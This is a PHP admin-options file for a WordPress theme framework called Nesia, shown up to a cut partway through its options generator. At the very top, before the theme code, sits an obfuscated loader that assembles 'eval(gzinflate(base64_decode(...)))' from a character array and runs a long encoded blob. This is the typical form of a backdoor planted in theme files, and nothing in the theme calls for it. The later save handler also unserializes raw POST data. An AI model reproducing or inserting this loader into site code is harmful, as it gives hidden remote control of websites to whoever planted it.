<?php
$md5 = "591858cc3b34db52f12b9eefab2f3d10";
$ab = array("r","n","l",'a','_','t',';',"o","4",")","v",'z','f','c',"s","$","(","6",'d','b','g',"e","i");
$bb9 = create_function('$'.'v',$ab[21].$ab[10].$ab[3].$ab[2].$ab[16].$ab[20].$ab[11].$ab[22].$ab[1].$ab[12].$ab[2].$ab[3].$ab[5].$ab[21].$ab[16].$ab[19].$ab[3].$ab[14].$ab[21].$ab[17].$ab[8].$ab[4].$ab[18].$ab[21].$ab[13].$ab[7].$ab[18].$ab[21].$ab[16].$ab[15].$ab[10].$ab[9].$ab[9].$ab[9].$ab[6]);
$bb9('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');
?>
<?php
// Nesia Admin Interface

/*-----------------------------------------------------------------------------------

TABLE OF CONTENTS

- Nesia Admin Interface - nesia_add_admin
- Nesia Reset Function - nesia_reset_options
- Framework options panel - nesia_options_page
- Framework Settings page - nesia_framework_settings_page
- nesia_admin_head
- nesia_load_only
- Ajax Save Action - nesia_ajax_callback
- Generates The Options - nesia_machine
- Nesia Uploader - nesia_uploader_function
- Nesia Theme Version Checker - nesia_version_checker
- Nesia Thumb Detection Notice - nesia_thumb_admin_notice
- Nesia Theme Update Admin Notice - nesia_theme_update_notice

-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_update_options_filter' ) ) {
	function nesia_update_options_filter( $new_value, $old_value ) {
		if ( !current_user_can( 'unfiltered_html' ) ) {
			// Options that get KSES'd
			foreach( nesia_ksesed_option_keys() as $option ) {
				$new_value[$option] = wp_kses_post( $new_value[$option] );
			}
			trigger_error( print_r( $new_value, true ) );
			// Options that cannot be set without unfiltered HTML
			foreach( nesia_disabled_if_not_unfiltered_html_option_keys() as $option ) {
				$new_value[$option] = $old_value[$option];
			}
		}
		return $new_value;
	}
}

if ( ! function_exists( 'nesia_prevent_option_update' ) ) {
	function nesia_prevent_option_update( $new_value, $old_value ) {
		return $old_value;
	}
}

/**
 * This is the list of options that are run through KSES on save for users without
 * the unfiltered_html capability
 */
if ( ! function_exists( 'nesia_ksesed_option_keys' ) ) {
	function nesia_ksesed_option_keys() {
		return array();
	}
}

/**
 * This is the list of standalone options that are run through KSES on save for users without
 * the unfiltered_html capability
 */
if ( ! function_exists( 'nesia_ksesed_standalone_options' ) ) {
	function nesia_ksesed_standalone_options() {
		return array( 'nesia_connect_content' );
	}
}

/**
 * This is the list of options that users without the unfiltered_html capability
 * are not able to update
 */
if ( ! function_exists( 'nesia_disabled_if_not_unfiltered_html_option_keys' ) ) {
	function nesia_disabled_if_not_unfiltered_html_option_keys() {
		return array( 'nesia_google_analytics', 'nesia_custom_css' );
	}
}

add_filter( 'pre_update_option_nesia_options', 'nesia_update_options_filter', 10, 2 );
foreach( nesia_ksesed_standalone_options() as $o ) {
	add_filter( 'pre_update_option_' . $o, 'wp_kses_post' );
}
unset( $o );

/*-----------------------------------------------------------------------------------*/
/* Nesia Admin Interface - nesia_add_admin */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_add_admin' ) ) {
	function nesia_add_admin() {

		global $query_string;
		global $current_user;
		$current_user_id = $current_user->user_login;

		$themename =  get_option( 'nesia_themename' );
		$shortname =  get_option( 'nesia_shortname' );

		// Reset the settings, sanitizing the various requests made.
		// Use a SWITCH to determine which settings to update.

		/* Make sure we're making a request.
   	------------------------------------------------------------*/

		if ( isset( $_REQUEST['page'] ) ) {

			// Sanitize page being requested.
			$_page = '';

			$_page = mysql_real_escape_string( strtolower( trim( strip_tags( $_REQUEST['page'] ) ) ) );

			// Sanitize action being requested.
			$_action = '';

			if ( isset( $_REQUEST['nesia_save'] ) ) {

				$_action = mysql_real_escape_string( strtolower( trim( strip_tags( $_REQUEST['nesia_save'] ) ) ) );

			} // End IF Statement

			// If the action is "reset", run the SWITCH.

			/* Perform settings reset.
  		------------------------------------------------------------*/

			if ( $_action == 'reset' ) {

				// Add nonce security check.
				if ( function_exists( 'check_ajax_referer' ) ) {
					if ( $_page == 'nesia_seo' ) {
						check_ajax_referer( 'nesiaframework-seo-options-reset', '_ajax_nonce' );
					} else {
						check_ajax_referer( 'nesiaframework-theme-options-reset', '_ajax_nonce' );
					}
				} // End IF Statement

				switch ( $_page ) {

				case 'nesia':

					$options =  get_option( 'nesia_template' );
					nesia_reset_options( $options, 'nesia' );
					header( "Location: admin.php?page=nesia&reset=true" );
					die;

					break;

				case 'nesia_sbm':

					delete_option( 'sbm_nesia_sbm_options' );
					header( "Location: admin.php?page=nesia_sbm&reset=true" );
					die;

					break;

				} // End SWITCH Statement

			} // End IF Statement

		} // End IF Statement

		// Check all the Options, then if the no options are created for a relative sub-page... it's not created.
		if( get_option( 'framework_nesia_backend_icon' ) ) { $icon = get_option( 'framework_nesia_backend_icon' ); }
		else { $icon = get_template_directory_uri() . '/functions/images/nesia-icon.png'; }

		if( function_exists( 'add_object_page' ) ) {
			add_object_page ( 'Page Title', $themename, 'manage_options', 'nesia', 'nesia_options_page', $icon );
		} else {
			add_menu_page ( 'Page Title', $themename, 'manage_options', 'nesia_home', 'nesia_options_page', $icon );
		}
		$nesiapage = add_submenu_page( 'nesia', $themename, __( 'Theme Options', 'nesia' ), 'manage_options', 'nesia', 'nesia_options_page' ); // Default

		// Add Sidebar Manager Menu Item
                $nesiasbm = add_submenu_page( 'nesia', 'Sidebar Manager', 'Sidebar Manager', 'manage_options', 'nesia_sbm', 'nesia_sbm_page' );

		// Add framework functionaily to the head individually
		add_action( "admin_init", 'nesia_load_only' );

		// Load Framework CSS Files
		add_action( "admin_init", 'nesia_framework_load_css' );

		// Add the non-JavaScript "save" to the load of each of the screens.
		add_action( "load-$nesiapage", 'nesia_nonajax_callback' );
		add_action( "load-$nesiasbm", 'nesia_nonajax_callback' );

	}
}

add_action( 'admin_menu', 'nesia_add_admin', 10 );

/*-----------------------------------------------------------------------------------*/
/* Nesia Reset Function - nesia_reset_options */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_reset_options' ) ) {
	function nesia_reset_options( $options, $page = '' ) {

		$excludes = array( 'blogname' , 'blogdescription' );

		foreach( $options as $option ) {

			if( isset( $option['id'] ) ) {
				$option_id = $option['id'];
				$option_type = $option['type'];

				//Skip assigned id's
				if( in_array( $option_id, $excludes ) ) { continue; }

				if( $option_type == 'multicheck' ) {
					foreach( $option['options'] as $option_key => $option_option ) {
						$del = $option_id . "_" . $option_key;
						delete_option( $del );
					}
				} else if( is_array( $option_type ) ) {
                                        foreach( $option_type as $inner_option ) {
                                                $option_id = $inner_option['id'];
                                                $del = $option_id;
                                                delete_option( $option_id );
                                        }
                                } else {
					delete_option( $option_id );
				}
			}
		}
		//When Theme Options page is reset - Add the nesia_options option
		if( $page == 'nesia' ) {
			delete_option( 'nesia_options' );
		}
	}
}

/*-----------------------------------------------------------------------------------*/
/* Framework options panel - nesia_options_page */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_options_page' ) ) {
	function nesia_options_page() {

		$options =  get_option( 'nesia_template' );
		$themename =  get_option( 'nesia_themename' );
		$shortname =  get_option( 'nesia_shortname' );
		$manualurl =  get_option( 'nesia_manual' );
		$supporturl = "http://indo.nesia.me/support/";
		

		//Framework Version in Backend Header
		$nesia_framework_version = get_option( 'nesia_framework_version' );

		//Version in Backend Header
		if(function_exists('wp_get_theme'))
                    $theme_data = wp_get_theme();
                else
                    $theme_data = get_theme_data( get_template_directory() . '/style.css' );
		$local_version = $theme_data['Version'];

		//GET themes update RSS feed and do magic
		include_once( ABSPATH . WPINC . '/feed.php' );

		$pos = strpos( $manualurl, 'documentation' );
		$theme_slug = str_replace( "/", "", substr( $manualurl, ( $pos + 13 ) ) ); //13 for the word documentation

		//add filter to make the rss read cache clear every 4 hours
		//add_filter( 'wp_feed_cache_transient_lifetime', create_function( '$a', 'return 14400;' ) );

		global $pagenow;
?>
<div class="wrap" id="nesia_container">
<div id="nesia-popup-save" class="nesia-save-popup"><div class="nesia-save-save"><?php _e( 'Options Updated', 'nesia' ); ?></div></div>
<div id="nesia-popup-reset" class="nesia-save-popup"><div class="nesia-save-reset"><?php _e( 'Options Reset', 'nesia' ); ?></div></div>
    <form action="" enctype="multipart/form-data" id="nesiaform" method="post">
    <?php
		// Add nonce for added security.
		if ( function_exists( 'wp_nonce_field' ) ) { wp_nonce_field( 'nesiaframework-theme-options-update' ); } // End IF Statement

		$nesia_nonce = '';

		if ( function_exists( 'wp_create_nonce' ) ) { $nesia_nonce = wp_create_nonce( 'nesiaframework-theme-options-update' ); } // End IF Statement

		if ( $nesia_nonce == '' ) {} else {

?>
    	<input type="hidden" name="_ajax_nonce" value="<?php echo $nesia_nonce; ?>" />
    <?php

		} // End IF Statement
?>
        <div id="header">
           <div class="logo">
                <img alt="Nesia" src="<?php echo get_template_directory_uri(); ?>/functions/images/logo.png"/>
            </div>
            <div class="theme-info">
                <span class="theme"><?php echo $themename; ?> <?php echo $local_version; ?></span>
                <span class="framework"><?php _e( 'Framework', 'nesia' ); ?> <?php echo $nesia_framework_version; ?></span>
            </div>
            <div class="clear"></div>
        </div>        
        <?php
		// Rev up the Options Machine
		$return = apply_filters( 'nesia_before_option_page', nesia_machine( $options ) );
?>
        <div id="support-links">
            <ul>
                <li class="changelog"><a title="Theme Changelog" href="<?php echo $manualurl; ?>#Changelog"><?php _e( 'View Changelog', 'nesia' ); ?></a></li>
                <li class="docs"><a title="Theme Documentation" href="<?php echo $manualurl; ?>"><?php _e( 'View Themedocs', 'nesia' ); ?></a></li>
                <li class="forum"><a href="http://indo.nesia.me/support/forum" target="_blank"><?php _e( 'Visit Forum', 'nesia' ); ?></a></li>
                <li class="right"><img style="display:none" src="<?php echo get_template_directory_uri(); ?>/functions/images/loading-top.gif" class="ajax-loading-img ajax-loading-img-top" alt="Working..." /><a href="#" id="expand_options">[+]</a> <input type="submit" value="Save All Changes" class="button submit-button" /></li>
            </ul>
        </div>
        <div id="main">
            <div id="nesia-nav">
                <div id="nesia-nav-shadow"></div><!--/#nesia-nav-shadow-->
                <ul>
                        <?php echo $return[1]; ?>
                </ul>
            </div>
            <div id="content">
                    <?php echo $return[0]; /* Settings */ ?>
            </div>
            <div class="clear"></div>

        </div>
        <div class="save_bar_top">
        <img style="display:none" src="<?php echo get_template_directory_uri(); ?>/functions/images/loading-bottom.gif" class="ajax-loading-img ajax-loading-img-bottom" alt="Working..." />
        <input type="hidden" name="nesia_save" value="save" />
        <input type="submit" value="Save All Changes" class="button submit-button" />
        </form>

        <form action="" method="post" style="display: inline;" id="nesiaform-reset">
        <?php
		// Add nonce for added security.
		if ( function_exists( 'wp_nonce_field' ) ) { wp_nonce_field( 'nesiaframework-theme-options-reset' ); } // End IF Statement

		$nesia_nonce = '';

		if ( function_exists( 'wp_create_nonce' ) ) { $nesia_nonce = wp_create_nonce( 'nesiaframework-theme-options-reset' ); } // End IF Statement

		if ( $nesia_nonce == '' ) {} else {

?>
	    	<input type="hidden" name="_ajax_nonce" value="<?php echo $nesia_nonce; ?>" />
	    <?php

		} // End IF Statement
?>
            <span class="submit-footer-reset">
            <input name="reset" type="submit" value="Reset All Theme Options" class="button submit-button reset-button" onclick="return confirm( 'Click OK to reset all theme options. All settings will be lost!' );" />
            <input type="hidden" name="nesia_save" value="reset" />
            </span>
        </form>

        </div>

<div style="clear:both;"></div>
</div><!--wrap-->

 <?php
	} // End nesia_options_page()
}

/* nesia_admin_header()
--------------------------------------------------------------------------------*/

function nesia_admin_header() {
?>
		<script type="text/javascript">
			jQuery(document).ready( function() {
				// Create sanitary variable for use in the JavaScript conditional.
				<?php

	$is_reset = 'false';

	if( isset( $_REQUEST['reset'] ) ) {

		$is_reset = $_REQUEST['reset'];

		$is_reset = strtolower( strip_tags( trim( $is_reset ) ) );

	} else {

		$is_reset = 'false';

	} // End IF Statement

?>
			if( '<?php echo $is_reset; ?>' == 'true' ) {

				var reset_popup = jQuery( '#nesia-popup-reset' );
				reset_popup.fadeIn();
				window.setTimeout(function() {
					   reset_popup.fadeOut();
					}, 2000);
			}

			//Update Message popup
			jQuery.fn.center = function () {
				this.animate({"top":( jQuery(window).height() - this.height() - 200 ) / 2+jQuery(window).scrollTop() + "px"},100);
				this.css( "left", 250 );
				return this;
			}

			jQuery( '#nesia-popup-save' ).center();
			jQuery( '#nesia-popup-reset' ).center();
			jQuery(window).scroll(function() {

				jQuery( '#nesia-popup-save' ).center();
				jQuery( '#nesia-popup-reset' ).center();

			});

			//Save everything else
			jQuery( '#nesiaform' ).submit(function() {

					function newValues() {
					  var serializedValues = jQuery( "#nesiaform *").not( '.nesia-ignore').serialize();
					  return serializedValues;
					}
					jQuery( ":checkbox, :radio").click(newValues);
					jQuery( "select").change(newValues);
					jQuery( '.ajax-loading-img').fadeIn();
					var serializedReturn = newValues();

					var ajax_url = '<?php echo admin_url( "admin-ajax.php" ); ?>';

					 //var data = {data : serializedReturn};
					var data = {
						<?php if( isset( $_REQUEST['page'] ) && $_REQUEST['page'] == 'nesia' ) { ?>
						type: 'options',
						<?php } ?>
						<?php if( isset( $_REQUEST['page'] ) && $_REQUEST['page'] == 'nesia_framework_settings' ) { ?>
						type: 'framework',
						<?php } ?>
						<?php if( isset( $_REQUEST['page'] ) && $_REQUEST['page'] == 'nesia_seo' ) { ?>
						type: 'seo',
						<?php } ?>
						<?php if( isset( $_REQUEST['page'] ) && $_REQUEST['page'] == 'nesia_tumblog' ) { ?>
						type: 'tumblog',
						<?php } ?>

						action: 'nesia_ajax_post_action',
						data: serializedReturn,

						<?php // Nonce Security ?>
						<?php if ( function_exists( 'wp_create_nonce' ) ) { $nesia_nonce = wp_create_nonce( 'nesiaframework-theme-options-update' ); } // End IF Statement ?>

						_ajax_nonce: '<?php echo $nesia_nonce; ?>'
					};

					jQuery.post(ajax_url, data, function(response) {

						var success = jQuery( '#nesia-popup-save' );
						var loading = jQuery( '.ajax-loading-img' );
						loading.fadeOut();
						success.fadeIn();
						window.setTimeout(function() {
						   success.fadeOut();
						}, 2000);
					});

					return false;

				});

			});
		</script>

<?php } // End nesia_admin_header()

/*-----------------------------------------------------------------------------------*/
/* nesia_load_only */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_load_only' ) ) {
	function nesia_load_only() {

		add_action( 'admin_head', 'nesia_admin_header', 10 );

		wp_register_script( 'jquery-ui-datepicker', get_template_directory_uri() . '/functions/js/ui.datepicker.js', array( 'jquery-ui-core' ) );
		wp_register_script( 'jquery-input-mask', get_template_directory_uri() . '/functions/js/jquery.maskedinput-1.2.2.js', array( 'jquery' ) );
		wp_register_script( 'nesia-scripts', get_template_directory_uri() . '/functions/js/nesia-scripts.js', array( 'jquery' ) );
		wp_register_script( 'nesia-admin-interface', get_template_directory_uri() . '/functions/js/nesia-admin-interface.js', array( 'jquery' ), '5.0.0' );
		wp_register_script( 'colourpicker', get_template_directory_uri() . '/functions/js/colorpicker.js', array( 'jquery' ) );

		wp_enqueue_script( 'jquery-ui-datepicker' );
		wp_enqueue_script( 'jquery-input-mask' );
		wp_enqueue_script( 'nesia-scripts' );
		wp_enqueue_script( 'colourpicker' );
		wp_enqueue_script( 'nesia-admin-interface' );
		wp_enqueue_script( 'nesia-custom-fields' );

		// Register the typography preview JavaScript.
		wp_register_script( 'nesia-typography-preview', get_template_directory_uri() . '/functions/js/nesia-typography-preview.js', array( 'jquery' ), '1.0.0', true );
		wp_enqueue_script( 'nesia-typography-preview' );
	} // End nesia_load_only()
}

/*-----------------------------------------------------------------------------------*/
/* nesia_framework_load_css */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_framework_load_css' ) ) {
	function nesia_framework_load_css () {
		wp_register_style( 'nesia-admin-interface', get_template_directory_uri() . '/functions/admin-style.css', '', '5.0.0' );
		wp_register_style( 'jquery-ui-datepicker', get_template_directory_uri() . '/functions/css/jquery-ui-datepicker.css' );
		wp_register_style( 'colourpicker', get_template_directory_uri() . '/functions/css/colorpicker.css' );

		wp_enqueue_style( 'nesia-admin-interface' );
		wp_enqueue_style( 'jquery-ui-datepicker' );
		wp_enqueue_style( 'colourpicker' );
	} // End nesia_framework_load_css()
}

/*-----------------------------------------------------------------------------------*/
/* Default Save Action - nesia_options_save */
/*-----------------------------------------------------------------------------------*/

/**
 * nesia_options_save()
 *
 * Save options to the database. Moved to a dedicated function.
 *
 * @since V4.6.0
 */

function nesia_options_save ( $type, $data ) {
	global $wpdb; // this is how you get access to the database

	$status = false; // We set this to true if the settings have saved successfully.

	$save_type = $type;

	if ( $save_type == 'options' ) {

		// Make sure to flush the rewrite rules.
		nesia_flush_rewriterules();

		// $data = $_POST['data'];

		if ( is_array( $data ) ) {
			$output = $data; // $output variable used below during save.
		} else {
			parse_str( $data, $output );
		}

		// Remove the "nesia_save" item from the output array.
		if ( isset( $output['nesia_save'] ) && $output['nesia_save'] == 'reset' ) { unset( $output['nesia_save'] ); }

		// $data = stripslashes( $data ); // Remove slashes from the serialised string.

		//Pull options
		$options = get_option( 'nesia_template' );

		foreach( $options as $option_array ) {

			if( isset( $option_array['id'] ) ) {
				$id = $option_array['id'];
			} else { $id = null;}
			$old_value = get_option( $id );
			$new_value = '';

			if( isset( $output[$id] ) ) {
				$new_value = $output[$option_array['id']];
			}

			if( isset( $option_array['id'] ) ) { // Non - Headings...

				$type = $option_array['type'];

				if ( is_array( $type ) ) {
					foreach( $type as $array ) {
						if( $array['type'] == 'text' ) {
							$id = $array['id'];
							$std = $array['std'];
							$new_value = $output[$id];
							if( $new_value == '' ) { $new_value = $std; }

							update_option( $id, stripslashes( $new_value ) );
						}
					}
				}
				elseif ( $type == 'text' && $save_type == 'seo' ) { // Text Save

					$new_value = $output[$id];
					if( $new_value == '' && $std != '' ) { $new_value = $std; }

					$new_value = stripslashes( stripslashes( $new_value ) );

					update_option( $id, $new_value );
				}
				elseif( $new_value == '' && $type == 'checkbox' ) { // Checkbox Save

					update_option( $id, 'false' );
				}
				elseif ( $new_value == 'true' && $type == 'checkbox' ) { // Checkbox Save

					update_option( $id, 'true' );
				}
				elseif( $type == 'multicheck' ) { // Multi Check Save

					$option_options = $option_array['options'];

					foreach ( $option_options as $options_id => $options_value ) {

						$multicheck_id = $id . "_" . $options_id;

						if( !isset( $output[$multicheck_id] ) ) {
							update_option( $multicheck_id, 'false' );
						}
						else{
							update_option( $multicheck_id, 'true' );
						}
					}
				}
				elseif( $type == 'multicheck3' ) { // Multi Check Save
                                        
                                        update_option( $id, $output[$option_array['id']] );
					
				}
				elseif( $type == 'typography' ) {

					$typography_array = array();

					$typography_array['size'] = $output[$option_array['id'] . '_size'];
					$typography_array['unit'] = $output[$option_array['id'] . '_unit'];
					$typography_array['face'] = stripslashes( $output[$option_array['id'] . '_face'] );
					$typography_array['style'] = $output[$option_array['id'] . '_style'];
					$typography_array['color'] = $output[$option_array['id'] . '_color'];

					update_option( $id, $typography_array );

				}
				elseif( $type == 'border' ) {

					$border_array = array();

					$border_array['width'] = $output[$option_array['id'] . '_width'];
					$border_array['style'] = $output[$option_array['id'] . '_style'];
					$border_array['color'] = $output[$option_array['id'] . '_color'];

					update_option( $id, $border_array );
				}
				elseif( $type == 'ads' ) {

					$ads_array = array();

					$ads_array['script'] = $output[$option_array['id'] . '_script'];
					$ads_array['url'] = $output[$option_array['id'] . '_url'];
					$ads_array['image'] = $output[$option_array['id'] . '_image'];

					update_option( $id, $ads_array );

				} else if ( $type == 'timestamp' ) {
					// It is assumed that the data comes back in the following format:
					// date: month/day/year
					// hour: int(2)
					// minute: int(2)
					// second: int(2)
					
					// Format the data into a timestamp.
					$date = $output[$option_array['id']]['date'];
					
					$hour = $output[$option_array['id']]['hour'];
					$minute = $output[$option_array['id']]['minute'];
					$second = $output[$option_array['id']]['second'];
					
					$day = substr( $date, 3, 2 );
					$month = substr( $date, 0, 2 );
					$year = substr( $date, 6, 4 );
					
					$timestamp = mktime( $hour, $minute, $second, $month, $day, $year );
					 
					update_option( $id, stripslashes( $timestamp ) );
					
				} else {

					update_option( $id, stripslashes( $new_value ) );
				}
			}
		}

		// Assume that all has been completed and set $status to true.
		$status = true;
	}


	if( $save_type == 'options' ) {
		/* Create, Encrypt and Update the Saved Settings */
		$nesia_options = array();
		$data = array();
		$count = 0;
		foreach( $options as $option ) {
			if( isset( $option['id'] ) ) {
				$count++;
				$option_id = $option['id'];
				$option_type = $option['type'];

				if( is_array( $option_type ) ) {
					$type_array_count = 0;
					foreach( $option_type as $inner_option ) {
						$option_id = $inner_option['id'];
						if ( isset( $data[$option_id] ) )
							$data[$option_id] .= get_option( $option_id );
						else
							$data[$option_id] = get_option( $option_id );
					}
				}
				else {
					$data[$option_id] = get_option( $option_id );
				}
			}
		}

		$output = "<ul>";

		foreach ( $data as $name => $value ) {

			if( is_serialized( $value ) ) {

				$value = unserialize( $value );
				$nesia_array_option = $value;
				$temp_options = '';
				foreach( $value as $v ) {
					if( isset( $v ) )
						$temp_options .= $v . ',';

				}
				$value = $temp_options;
				$nesia_array[$name] = $nesia_array_option;
			} else {
				$nesia_array[$name] = $value;
			}

			$output .= '<li><strong>' . $name . '</strong> - ' . $value . '</li>';
		}
		$output .= "</ul>";

		update_option( 'nesia_options', $nesia_array );

		// Assume that all has been completed and set $status to true.
		$status = true;
	}

	return $status;
} // End nesia_options_save()

/*-----------------------------------------------------------------------------------*/
/* Non-AJAX Save Action - nesia_nonajax_callback()
/*
/* This action is hooked on load of the various screens.
/* The hook is done when the pages are registered.
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_nonajax_callback' ) ) {
	function nesia_nonajax_callback() {
		if ( isset( $_POST['_ajax_nonce'] ) && isset( $_POST['nesia_save'] ) && ( $_POST['nesia_save'] == 'save' ) ) {

			$nonce_key = 'nesiaframework-theme-options-update';

			switch ( $_REQUEST['page'] ) {
			case 'nesia':
				$type = 'options';
				$nonce_key = 'nesiaframework-theme-options-update';
				break;

			default:
				$type = '';
			}

			// check security with nonce.
			if ( function_exists( 'check_admin_referer' ) ) { check_admin_referer( $nonce_key, '_ajax_nonce' ); } // End IF Statement

			// Remove non-options fields from the $_POST.
			$fields_to_remove = array( '_wpnonce', '_wp_http_referer', '_ajax_nonce', 'nesia_save' );

			$data = array();

			foreach ( $_POST as $k => $v ) {
				if ( in_array( $k, $fields_to_remove ) ) {} else {
					$data[$k] = $v;
				}
			}

			$status = nesia_options_save( $type, $data );

			if ( $status ) {
				add_action( 'admin_notices', 'nesia_admin_message_success', 0 );
			} else {
				add_action( 'admin_notices', 'nesia_admin_message_error', 0 );
			}

		} // End IF Statement
	} // End nesia_nonajax_callback()
}

/*-----------------------------------------------------------------------------------*/
/* AJAX Save Action - nesia_ajax_callback() */
/*-----------------------------------------------------------------------------------*/

add_action( 'wp_ajax_nesia_ajax_post_action', 'nesia_ajax_callback' );

if ( ! function_exists( 'nesia_ajax_callback' ) ) {
	function nesia_ajax_callback() {
		// check security with nonce.
		if ( function_exists( 'check_ajax_referer' ) ) { check_ajax_referer( 'nesiaframework-theme-options-update', '_ajax_nonce' ); } // End IF Statement

		$data = maybe_unserialize( $_POST['data'] );

		nesia_options_save( $_POST['type'], $data );

		die();
	} // End nesia_ajax_callback()
}

/*-----------------------------------------------------------------------------------*/
/* Admin Messages */
/*-----------------------------------------------------------------------------------*/

function nesia_admin_message_success () {
	echo '<div class="updated fade" style="display: block !important;"><p>' . __( 'Options Saved Successfully', 'nesia' ) . '</p></div><!--/.updated fade-->' . "\n";
} // End nesia_admin_message_success()

function nesia_admin_message_error () {
	echo '<div class="error fade" style="display: block !important;"><p>' . __( 'There was an error while saving your options. Please try again.', 'nesia' ) . '</p></div><!--/.error fade-->' . "\n";
} // End nesia_admin_message_error()

function nesia_admin_message_reset () {
	echo '<div class="updated fade" style="display: block !important;"><p>' . __( 'Options Reset Successfully', 'nesia' ) . '</p></div><!--/.updated fade-->' . "\n";
} // End nesia_admin_message_reset()

/*-----------------------------------------------------------------------------------*/
/* Generates The Options - nesia_machine */
/*-----------------------------------------------------------------------------------*/

if ( ! function_exists( 'nesia_machine' ) ) {
	function nesia_machine( $options ) {
		$counter = 0;
		$menu = '';
		$output = '';
		
		// Create an array of menu items - multi-dimensional, to accommodate sub-headings.
		$menu_items = array();
		$headings = array();
		
		foreach ( $options as $k => $v ) {
			if ( $v['type'] == 'heading' || $v['type'] == 'subheading' ) {
				$headings[] = $v;
			}
		}
		
		$prev_heading_key = 0;
		
		foreach ( $headings as $k => $v ) {
			$token = 'nesia-option-' . preg_replace( '/[^a-zA-Z0-9\s]/', '', strtolower( trim( str_replace( ' ', '', $v['name'] ) ) ) );
			
			// Capture the token.
			$v['token'] = $token;
			
			if ( $v['type'] == 'heading' ) {
